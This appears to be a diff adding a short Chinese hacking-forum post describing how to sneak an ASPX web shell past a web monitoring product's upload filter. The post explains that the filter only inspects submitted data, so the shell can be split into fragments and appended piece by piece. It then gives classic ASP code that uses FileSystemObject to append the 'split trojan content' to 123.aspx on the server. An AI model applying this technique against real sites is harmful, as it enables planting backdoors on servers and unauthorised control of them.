@@ -1,0 +1,58 @@
+
+A way to upload aspxshell for《一流监控系统》
+
+《一流监控系统》大家都知道是怎么回事了，主要是上传数据被过滤掉，比如varchar等等字符。
+
+昨天priest 说有个监控系统，不能上传aspx马,我试了下 asp马是可以加密了上传的，aspx马是没那个说了。 之后我想到了asp追加数据。
+
+结果一试，还真不错..我们把aspx马拆分N块代码，陆续追加上去。 比如varchar字符为例子，第一批传“varch” 第二批传“ar”...试了一下可以上传。 可是遇到了一点点小麻烦，就是上传时候总是换行上传，这个问题大牛解决下…… 
+《一流监控系统》 只检查上报时的数据，不检查上报后的文件。
+
+之后就丢代码： <%
+
+
+
+Set MyFileObject=Server.CreateObject("Scripting.FileSystemObject")
+
+
+
+filename=server.mappath("123.aspx")
+
+
+
+IF MyFileObject.FileExists(filename) then 
+
+
+
+Response.write("存在这个文件<br>")
+
+
+
+Set MyTextFile=MyFileObject.OpenTextFile(filename,8,TRUE)
+
+
+
+MyTextFile.WriteLine("拆分的木马内容")
+
+
+
+MyTextFile.Close
+
+
+
+response.write "追加成功"
+
+
+
+Else
+
+
+
+Response.write("追加失败，无法找到追加文件")
+
+
+
+END IF
+
+%>
+复制代码
